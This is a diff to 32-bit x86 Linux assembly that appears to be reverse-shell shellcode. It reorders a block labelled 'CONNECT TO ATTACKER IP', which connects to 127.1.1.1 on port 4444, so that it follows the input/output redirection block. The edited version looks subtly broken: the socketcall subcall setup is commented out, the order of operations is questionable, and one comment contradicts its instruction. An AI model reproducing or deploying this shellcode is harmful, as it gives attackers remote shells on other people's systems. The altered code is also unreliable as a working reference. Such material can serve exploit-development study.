@@ -137,30 +137,7 @@ _start:
 	mov ecx, esp		; Move stack args into ECX.
 	int 0x80
 	mov esi, eax		; Save results to ESI.
-
-	; +==----------------------==+
-	; |  CONNECT TO ATTACKER IP  |
-	; +==----------------------==+
-
-	push BYTE 0x66		; Load SOCKETCALL with SYS_CONNECT.
-	pop eax
-	mov bl, 0x3
 	
-	; Assemble the struct required
-	push DWORD 0x0101017F	; Address: 127.1.1.1
-	push WORD 0x5c11	; Port: 4444
-	push WORD 0x2		; AF_INET
-	mov ecx, esp		; Move pointer into ECX	
-
-	; Put ecx = (sockfd, struct sa, sizeof(sa))
-	push BYTE 0x10		; sizeof(sa) = 0x10 = 16 bytes
-	push ecx		; Move the struct onto the stack
-	push esi		; Put the sockfd onto the stack
-	mov ecx, esp		; Push struct pointer into ECX.
-	push BYTE 0x10		; ADDRLEN = 16 = 0x10
-	pop edx			; Move ADDRLEN into EDX.
-	int 0x80
-
 	; +==-----------------------==+
 	; |  REDIRECT INPUTS/OUTPUTS  |
 	; +==-----------------------==+
@@ -176,6 +153,22 @@ _start:
 	int 0x80
 	mov al, 0x3F
 	inc ecx
+	int 0x80
+
+	; +==----------------------==+
+	; |  CONNECT TO ATTACKER IP  |
+	; +==----------------------==+
+
+	push BYTE 0x66		; Load SOCKETCALL with SYS_CONNECT.
+	pop eax
+	; mov bl, 0x3
+	mov esi, ebx		; Move sockfd into EBX.
+	push DWORD 0x0101017F	; Address: 127.1.1.1
+	push WORD 0x115c	; Port: 4444
+	push WORD 0x2		; AF_INET
+	mov ecx, esp		; Push struct pointer into ECX.
+	push BYTE 0x10		; ADDRLEN = 16 = 0x10
+	pop edx			; Move ADDRLEN into EDX.
 	int 0x80
 
 	; +==-------------------==+
